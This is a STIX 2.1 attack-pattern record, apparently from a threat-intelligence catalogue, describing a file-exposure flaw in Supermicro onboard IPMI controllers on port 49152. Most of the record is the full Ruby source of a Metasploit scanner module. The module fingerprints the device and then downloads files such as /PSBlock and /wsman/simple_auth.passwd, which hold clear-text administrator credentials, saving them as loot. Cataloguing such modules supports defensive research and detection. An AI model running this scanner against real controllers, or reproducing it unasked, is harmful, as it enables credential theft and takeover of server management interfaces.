{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--0d83b622-6f5d-4897-bb21-ce8682150c14",
    "created": "2024-08-14T16:28:29.257297Z",
    "modified": "2024-08-14T16:28:29.257301Z",
    "name": "Supermicro Onboard IPMI Port 49152 Sensitive File Exposure",
    "description": " This module abuses a file exposure vulnerability accessible through the web interface on port 49152 of Supermicro Onboard IPMI controllers.  The vulnerability allows an attacker to obtain detailed device information and download data files containing the clear-text usernames and passwords for the controller. In May of 2014, at least 30,000 unique IPs were exposed to the internet with this vulnerability. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/scanner/http/smt_ipmi_49152_exposure.rb",
            "external_id": "smt_ipmi_49152_exposure.rb"
        },
        {
            "source_name": "reference",
            "url": "http://blog.cari.net/carisirt-yet-another-bmc-vulnerability-and-some-added-extras/"
        },
        {
            "source_name": "reference",
            "url": "https://github.com/zenfish/ipmi/blob/master/dump_SM.py"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nrequire 'uri'\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Auxiliary::Scanner\n  include Msf::Auxiliary::Report\n\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'        => 'Supermicro Onboard IPMI Port 49152 Sensitive File Exposure',\n      'Description' => %q{\n        This module abuses a file exposure vulnerability accessible through the web interface\n        on port 49152 of Supermicro Onboard IPMI controllers.  The vulnerability allows an attacker\n        to obtain detailed device information and download data files containing the clear-text\n        usernames and passwords for the controller. In May of 2014, at least 30,000 unique IPs\n        were exposed to the internet with this vulnerability.\n      },\n      'Author'       =>\n        [\n          'Zach Wikholm <kestrel[at]trylinux.us>', # Discovery and analysis\n          'John Matherly <jmath[at]shodan.io>',    # Internet-wide scan\n          'Dan Farmer <zen[at]fish2.com>',         # Additional investigation\n          'hdm'                                    # Metasploit module\n        ],\n      'License'     => MSF_LICENSE,\n      'References'  =>\n        [\n          [ 'URL', 'http://blog.cari.net/carisirt-yet-another-bmc-vulnerability-and-some-added-extras/'],\n          [ 'URL', 'https://github.com/zenfish/ipmi/blob/master/dump_SM.py']\n        ],\n      'DisclosureDate' => '2014-06-19'))\n\n    register_options(\n      [\n        Opt::RPORT(49152)\n      ])\n  end\n\n  def is_supermicro?\n    res = send_request_cgi(\n      {\n        \"uri\"       => \"/IPMIdevicedesc.xml\",\n        \"method\"    => \"GET\"\n      })\n\n    if res && res.code == 200 && res.body.to_s =~ /supermicro/i\n      path = store_loot(\n        'supermicro.ipmi.devicexml',\n        'text/xml',\n        rhost,\n        res.body.to_s,\n        'IPMIdevicedesc.xml'\n      )\n      print_good(\"Stored the device description XML in #{path}\")\n      return true\n    else\n      return false\n    end\n  end\n\n\n  def run_host(ip)\n\n    unless is_supermicro?\n      vprint_error(\"This does not appear to be a Supermicro IPMI controller\")\n      return\n    end\n\n    candidates = %W{ /PSBlock /PSStore /PMConfig.dat /wsman/simple_auth.passwd }\n\n    candidates.each do |uri|\n      res = send_request_cgi(\n        {\n          \"uri\"       => uri,\n          \"method\"    => \"GET\"\n        })\n\n      next unless res\n\n      unless res.code == 200 && res.body.length > 0\n        vprint_status(\"Request for #{uri} resulted in #{res.code}\")\n        next\n      end\n\n      path = store_loot(\n        'supermicro.ipmi.passwords',\n        'application/octet-stream',\n        rhost,\n        res.body.to_s,\n        uri.split('/').last\n      )\n      print_good(\"Password data from #{uri} stored to #{path}\")\n    end\n  end\nend\n",
    "x_mitre_disclosure_date": "2014-06-19"
}